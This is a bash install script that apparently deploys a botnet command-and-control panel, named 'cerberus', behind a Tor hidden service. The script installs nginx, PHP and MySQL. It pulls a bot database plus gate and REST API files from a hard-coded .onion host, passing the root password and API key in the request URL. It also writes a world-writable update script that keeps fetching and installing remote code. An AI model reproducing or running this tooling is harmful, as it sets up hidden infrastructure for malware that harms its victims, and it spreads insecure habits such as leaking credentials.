#!/bin/bash

echo "Enter root password:"
read password
echo "Enter api crypt key:"
read apicryptkey

TORDOMAINMY="cerberesfgqzqou7.onion"


apt update

apt install systemd nginx tor php-fpm mysql-server php php-cli php-xml php-mysql php-curl php-mbstring php-zip unzip -y
apt purge apache2 -y

#CREATE TOR SERVICE CONFIG FILE
rm -rf /lib/systemd/system/tor.service
read -r -d '' TORCONFIG << EOM
[Unit]
Description=TOR CONFIG

[Service]
User=root
Group=root
RemainAfterExit=yes
ExecStart=/usr/bin/tor --RunAsDaemon 0
ExecReload=/bin/killall tor
KillSignal=SIGINT
TimeoutStartSec=300
TimeoutStopSec=60
Restart=on-failure

[Install]
WantedBy=multi-user.target
EOM

echo "$TORCONFIG" > /lib/systemd/system/tor.service

rm -rf /usr/share/tor/tor-service-defaults-torrc
rm -rf /etc/tor/torrc

#CREATE TOR CONFNIG FILE
read -r -d '' ServiceCFG << EOM
HiddenServiceDir /var/lib/tor/cerberus
HiddenServicePort 80 127.0.0.1:8080
EOM

echo "$ServiceCFG" > /etc/tor/torrc

#remove old domain info
rm -rf /var/lib/tor/cerberus/

systemctl daemon-reload
systemctl restart tor
sleep 5

#GET PHP FPM VERSION
FPMVERSION=$(find /run/php/ -name 'php7.*-fpm.sock' | head -n 1)

read -r -d '' PHPCONFIGFPM << EOM
    location ~ \.php$ { 
        try_files \$uri =404; 
        include /etc/nginx/fastcgi.conf;
        fastcgi_pass unix:$FPMVERSION; 
    }
EOM

#READ HOSTNAME FOR NGINX WEBSITE
TORHOSTNAME=$(cat /var/lib/tor/cerberus/hostname)

read -r -d '' DefaultNGINX << EOM
server {
        listen 80 default_server;
        listen [::]:80 default_server;
        root /var/www/html;
        index index.html;
        server_name _;
        
        add_header Access-Control-Allow-Origin "*";
        
        $PHPCONFIGFPM
}
server {
        listen 8080 default_server;
        listen [::]:8080 default_server;
        root /var/www/tor;
        index index.html;
        server_name $TORHOSTNAME;
        
        add_header Access-Control-Allow-Origin "*";
        
        $PHPCONFIGFPM
}
EOM

echo "$DefaultNGINX" > /etc/nginx/sites-available/default

#SET MAX UPLOAD SIZE OF FILE
sed -i 's/keepalive_timeout/client_max_body_size 200M;\nkeepalive_timeout/g' /etc/nginx/nginx.conf

mkdir /var/www/tor

echo "hi $TORHOSTNAME new website" > /var/www/tor/index.html

nginx -s reload
systemctl restart nginx
systemctl restart tor

sleep 5

#IMPORT DB
torsocks wget http://$TORDOMAINMY/bot.sql
mysql -uroot --password="$password" -e "CREATE DATABASE bot /*\!40100 DEFAULT CHARACTER SET utf8 */;"
mysql -uroot --password="$password" -e "CREATE USER 'non-root'@'localhost' IDENTIFIED BY '$password';"
mysql -uroot --password="$password" bot < bot.sql
mysql -uroot --password="$password" -e "GRANT ALL PRIVILEGES ON *.* TO 'non-root'@'localhost';"
mysql -uroot --password="$password" -e "FLUSH PRIVILEGES;"
rm -rf bot.sql

#CREATE DB CONNECTION CONFIG
read -r -d '' CONFIGPHP << EOM
<?php
define('server' , 'localhost');
define('user', 'non-root');
define('db', 'bot');
define('passwd' , '$password');
?>
EOM

echo "$CONFIGPHP" > /var/www/config.php


cd /var/www
torsocks wget -O files.zip http://$TORDOMAINMY/update/update.php?key=$apicryptkey\&pass=$password
unzip files.zip
mv gate.php /var/www/html/gate.php
mv restapi.php /var/www/tor/restapi.php
rm -rf files.zip


#CREATE UPDATE SCRIPT
read -r -d '' updateScript << EOM
#!/bin/bash
cd /var/www
torsocks wget -O files.zip http://$TORDOMAINMY/update/update.php?key=\$1\\&pass=\$2
unzip files.zip
mv gate.php /var/www/html/gate.php
mv restapi.php /var/www/tor/restapi.php
rm -rf files.zip
EOM

echo "$updateScript" > /var/www/update.sh

chmod 777 /var/www/update.sh
chown -R www-data:www-data /var/www

echo ""
echo "============================="
echo "SERVER DETAILS"
echo "Tor domain: $TORHOSTNAME"
echo "Mysql user: non-root"
echo "Mysql root password: $password"
echo "Api crypt key $apicryptkey"
echo "INSTALL COMPLETED"
